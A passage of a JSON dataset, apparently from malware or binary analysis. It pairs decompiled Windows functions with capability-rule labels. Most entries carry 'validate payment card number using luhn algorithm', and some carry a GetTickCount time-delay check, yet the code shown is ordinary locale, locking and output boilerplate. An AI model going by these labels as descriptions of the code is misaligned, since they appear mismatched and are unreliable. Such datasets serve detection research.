            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045aaad(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    if (arg_ch != 0) {\n        do {\n            uVar1 = *(arg_8h + uVar3 * 2);\n            arg_8h_00 = fcn.0046656a();\n            iVar2 = fcn.00455ad2(arg_8h_00, uVar1, 0x103);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_ch);\n    }\n    return 1;\n}\n",
        "token_count": 189
    },
    "0045aaec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045aaec(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    if (arg_ch != 0) {\n        do {\n            uVar1 = *(arg_8h + uVar3 * 2);\n            arg_8h_00 = fcn.0046656a();\n            iVar2 = fcn.00455ad2(arg_8h_00, uVar1, 4);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_ch);\n    }\n    return 1;\n}\n",
        "token_count": 187
    },
    "0045bfaa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045bfaa(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint extraout_ECX;\n    uint arg_10h_00;\n    uint arg_18h;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_14h);\n    arg_18h = 1;\n    uVar1 = extraout_ECX;\n    arg_10h_00 = extraout_ECX;\n    fcn.0045add1(&stack0xffffffb8, arg_8h, arg_ch);\n    uVar1 = fcn.0045ae07(&var_2ch, uVar1, arg_10h_00, arg_10h, arg_18h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 196
    },
    "0045bff1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045bff1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint extraout_ECX;\n    uint arg_10h_00;\n    uint arg_18h;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_14h);\n    arg_18h = 1;\n    uVar1 = extraout_ECX;\n    arg_10h_00 = extraout_ECX;\n    fcn.0045adec(&stack0xffffffb8, arg_8h, arg_ch);\n    uVar1 = fcn.0045b04e(&var_2ch, uVar1, arg_10h_00, arg_10h, arg_18h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 196
    },
    "0045c038": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0045c038(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint extraout_ECX;\n    ulong uVar1;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_14h);\n    arg_18h = 1;\n    arg_ch_00 = extraout_ECX;\n    arg_10h_00 = extraout_ECX;\n    fcn.0045add1(&stack0xffffffb4, arg_8h, arg_ch);\n    uVar1 = fcn.0045b65c(&var_2ch, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 205
    },
    "0045c085": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0045c085(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint extraout_ECX;\n    ulong uVar1;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_14h);\n    arg_18h = 1;\n    arg_ch_00 = extraout_ECX;\n    arg_10h_00 = extraout_ECX;\n    fcn.0045adec(&stack0xffffffb4, arg_8h, arg_ch);\n    uVar1 = fcn.0045b924(&var_2ch, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 204
    },
    "0045c125": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0045c125(uint arg_8h)\n\n{\n    ulong uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045b65c(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 93
    },
    "0045c16a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0045c16a(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_ch);\n    uVar1 = fcn.0045b65c(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "0045c1b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045c1b0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_ch);\n    uVar1 = fcn.0045ae07(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "0045c1f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045c1f0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_ch);\n    uVar1 = fcn.0045ae07(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "0045c230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0045c230(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_ch);\n    uVar1 = fcn.0045b65c(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 97
    },
    "0045c276": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c276(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    if (arg_10h == NULL) {\n        arg_8h_00 = fcn.0046656a();\n    }\n    else {\n        arg_8h_00 = **arg_10h;\n    }\n    fcn.00455ad2(arg_8h_00, arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 114
    },
    "0045c2f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045c2f5(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045b04e(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0045c334": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0045c334(uint arg_8h)\n\n{\n    ulong uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045b924(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 92
    },
    "0045c379": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0045c379(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_ch);\n    uVar1 = fcn.0045b924(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 96
    },
    "0045c3bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045c3bf(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_ch);\n    uVar1 = fcn.0045b04e(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "0045c3ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045c3ff(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045b04e(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "0045c43e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045c43e(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_ch);\n    uVar1 = fcn.0045b04e(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "0045c47e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0045c47e(uint arg_8h)\n\n{\n    ulong uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045b924(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 93
    },
    "0045c4c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0045c4c3(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(arg_ch);\n    uVar1 = fcn.0045b924(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "0045c509": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045c509(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045ae07(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 92
    },
    "0045c548": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045c548(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045ae07(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 92
    },
    "0045c587": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0045c587(uint arg_8h)\n\n{\n    ulong uVar1;\n    uint var_2ch;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045b65c(&var_2ch, arg_8h, 0, 10, 1);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 93
    },
    "0045e41b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0045e41b(uint *arg_8h, uchar *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    uint arg_18h_00;\n    int32_t iVar1;\n    int32_t var_ch;\n    \n    arg_18h_00 = fcn.0046b59f(*arg_8h, arg_8h[1], arg_1ch + 1, 1, &var_ch, arg_14h, arg_18h);\n    iVar1 = -1;\n    if (arg_10h != -1) {\n        iVar1 = (arg_10h - (var_ch == 0x2d)) - (0 < arg_1ch);\n    }\n    iVar1 = fcn.00468f46(arg_ch + (0 < arg_1ch) + (var_ch == 0x2d), iVar1, arg_1ch + 1, &var_ch, arg_18h_00, arg_28h, \n                         arg_2ch);\n    if (iVar1 == 0) {\n        fcn.0045e4bf(arg_ch, arg_10h, arg_1ch, arg_20h, arg_24h, &var_ch, 0, arg_2ch);\n    }\n    else {\n        *arg_ch = 0;\n    }\n    return;\n}\n",
        "token_count": 347
    },
    "0045e612": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0045e612(uint *arg_8h, uchar *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint arg_18h_00;\n    int32_t iVar1;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint uStack8;\n    \n    var_ch = 0;\n    var_8h = 0;\n    uStack8 = 0;\n    arg_18h_00 = fcn.0046b59f(*arg_8h, arg_8h[1], arg_1ch, 0, &var_ch, arg_14h, arg_18h);\n    iVar1 = -1;\n    if (arg_10h != -1) {\n        iVar1 = arg_10h - (var_ch == 0x2d);\n    }\n    iVar1 = fcn.00468f46(arg_ch + (var_ch == 0x2d), iVar1, var_8h + arg_1ch, &var_ch, arg_18h_00, arg_20h, arg_24h);\n    if (iVar1 == 0) {\n        fcn.0045e6a8(arg_ch, arg_10h, arg_1ch, &var_ch, 0, arg_24h);\n    }\n    else {\n        *arg_ch = 0;\n    }\n    return;\n}\n",
        "token_count": 342
    },
    "0045e796": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0045e796(uint *arg_8h, uchar *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    bool bVar4;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint uStack16;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    var_10h = 0;\n    uStack16 = 0;\n    var_4h = fcn.0046b59f(*arg_8h, arg_8h[1], arg_1ch, 0, &var_14h, arg_14h, arg_18h);\n    bVar4 = var_14h == 0x2d;\n    var_8h = var_10h + -1;\n    iVar2 = -1;\n    if (arg_10h != -1) {\n        iVar2 = arg_10h - bVar4;\n    }\n    iVar2 = fcn.00468f46(arg_ch + bVar4, iVar2, arg_1ch, &var_14h, var_4h, arg_28h, arg_2ch);\n    if (iVar2 == 0) {\n        iVar2 = var_10h + -1;\n        if ((iVar2 < -4) || (arg_1ch <= iVar2)) {\n            fcn.0045e4bf(arg_ch, arg_10h, arg_1ch, arg_20h, arg_24h, &var_14h, 1, arg_2ch);\n        }\n        else {\n            pcVar1 = arg_ch + bVar4;\n            if (var_8h < iVar2) {\n                do {\n                    pcVar3 = pcVar1;\n                    pcVar1 = pcVar3 + 1;\n                } while (*pcVar3 != '\\0');\n                pcVar3[-1] = '\\0';\n            }\n            fcn.0045e6a8(arg_ch, arg_10h, arg_1ch, &var_14h, 1, arg_2ch);\n        }\n    }\n    else {\n        *arg_ch = 0;\n    }\n    return;\n}\n",
        "token_count": 557
    },
    "0045ed28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045ed28(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_18h);\n    uVar1 = fcn.0045eb63(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 120
    },
    "0045ed63": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045ed63(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *arg_18h;\n    uint var_2ch;\n    uint var_4h;\n    \n    fcn.0043b732(0);\n    var_4h = 0;\n    arg_18h = &var_2ch;\n    uVar1 = fcn.004653f5();\n    iVar2 = fcn.0045eb63(&var_4h, arg_8h, uVar1, arg_ch, arg_18h);\n    uVar1 = var_4h;\n    if (iVar2 != 0) {\n        uVar1 = 0xffffffff;\n    }\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 185
    },
    "0045edaf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045edaf(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045eb63(arg_8h, arg_ch, arg_10h, arg_14h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 112
    },
    "0045ef3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045ef3a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_14h);\n    uVar1 = fcn.0045ee07(arg_8h, arg_ch, arg_10h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "0045ef72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045ef72(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045ee07(arg_8h, arg_ch, arg_10h, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 101
    },
    "0045f18d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f18d(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 43
    },
    "0045f1a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f1a1(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x20);\n    return;\n}\n",
        "token_count": 45
    },
    "0045f1f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint __cdecl fcn.0045f1f4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    ushort uVar2;\n    uint uVar3;\n    ushort extraout_var;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00430e10(0x486c40, 0xc);\n    iVar1 = *(unaff_EBP + 0xc);\n    if (iVar1 == 0) {\n        iVar1 = *(unaff_EBP + 0x10);\n        *(iVar1 + 0x1c) = 1;\n        *(iVar1 + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, iVar1);\n        uVar3 = 0xffff;\n    }\n    else {\n        *(unaff_EBP + -0x1c) = 0xffff;\n        fcn.0045f18d(iVar1);\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.0045f2ee(*(unaff_EBP + 8), iVar1, *(unaff_EBP + 0x10));\n        *(unaff_EBP + -0x1c) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0045f27c();\n        uVar3 = CONCAT22(extraout_var, uVar2);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar3;\n}\n",
        "token_count": 436
    },
    "0045f284": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f284(uint arg_8h, uint16_t **arg_ch, uint arg_10h)\n\n{\n    uint16_t **ppuVar1;\n    \n    ppuVar1 = arg_ch + 2;\n    *ppuVar1 = *ppuVar1 + -1;\n    if (*ppuVar1 < 0) {\n        fcn.0046d9a8(arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    **arg_ch = arg_8h;\n    *arg_ch = *arg_ch + 1;\n    return;\n}\n",
        "token_count": 136
    },
    "0045f2b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045f2b8(uint arg_8h, uint arg_ch)\n\n{\n    ushort uVar1;\n    ushort extraout_var;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045f2ee(arg_8h, arg_ch, &var_28h);\n    fcn.0043b78b();\n    return CONCAT22(extraout_var, uVar1);\n}\n",
        "token_count": 105
    },
    "0045f426": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f426(uint arg_8h)\n\n{\n    uint arg_ch;\n    \n    arg_ch = fcn.0045f0eb(1);\n    fcn.0045f44b(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 60
    },
    "0045f44b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045f44b(uint arg_8h, uint arg_ch)\n\n{\n    ushort uVar1;\n    ushort extraout_var;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045f1f4(arg_8h, arg_ch, &var_28h);\n    fcn.0043b78b();\n    return CONCAT22(extraout_var, uVar1);\n}\n",
        "token_count": 105
    },
    "0045f5cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045f5cb(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045f5ff(arg_8h, arg_ch, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 92
    },
    "0045f5ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045f5ff(uint32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    \n    piVar1 = arg_ch + 2;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 < 0) {\n        uVar2 = fcn.0046d99d(arg_8h, arg_ch, arg_10h);\n        return uVar2;\n    }\n    **arg_ch = arg_8h;\n    *arg_ch = *arg_ch + 1;\n    return arg_8h & 0xff;\n}\n",
        "token_count": 158
    },
    "0045f62c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f62c(uint arg_8h)\n\n{\n    uint arg_ch;\n    \n    arg_ch = fcn.0045f0eb(1);\n    fcn.0045f651(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 60
    },
    "0045f651": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045f651(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(0);\n    uVar1 = fcn.0045f497(arg_8h, arg_ch, &var_28h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 90
    },
    "0045fc9f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045fc9f(void)\n\n{\n    fcn.00460090(0, \"AreFileApisANSI\", 0x47f2b4, \"AreFileApisANSI\");\n    return;\n}\n",
        "token_count": 50
    },
    "0045fcb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045fcb9(void)\n\n{\n    fcn.00460090(1, \"CompareStringEx\", 0x47f2c8, \"CompareStringEx\");\n    return;\n}\n",
        "token_count": 46
    },
    "0045fcd3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045fcd3(void)\n\n{\n    fcn.00460090(2, \"EnumSystemLocalesEx\", 0x47f2e0, \"EnumSystemLocalesEx\");\n    return;\n}\n",
        "token_count": 50
    },
    "0045fd6f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045fd6f(void)\n\n{\n    fcn.00460090(4, \"GetDateFormatEx\", 0x47f314, \"GetDateFormatEx\");\n    return;\n}\n",
        "token_count": 44
    },
    "0045fdbd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045fdbd(void)\n\n{\n    fcn.00460090(8, \"GetLocaleInfoEx\", 0x47f384, \"GetLocaleInfoEx\");\n    return;\n}\n",
        "token_count": 45
    },
    "0045fe25": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045fe25(void)\n\n{\n    fcn.00460090(0xb, \"GetTimeFormatEx\", 0x47f3e0, \"GetTimeFormatEx\");\n    return;\n}\n",
        "token_count": 48
    },
    "0045fe3f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045fe3f(void)\n\n{\n    fcn.00460090(0xc, \"GetUserDefaultLocaleName\", 0x47f3f8, \"GetUserDefaultLocaleName\");\n    return;\n}\n",
        "token_count": 51
    },
    "0045fea7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045fea7(void)\n\n{\n    fcn.00460090(0x10, \"IsValidLocaleName\", 0x47f468, \"IsValidLocaleName\");\n    return;\n}\n",
        "token_count": 45
    },
    "0045fec1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045fec1(void)\n\n{\n    fcn.00460090(0x12, \"LCIDToLocaleName\", 0x47f49c, \"LCIDToLocaleName\");\n    return;\n}\n",
        "token_count": 50
    },
    "0045fedb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
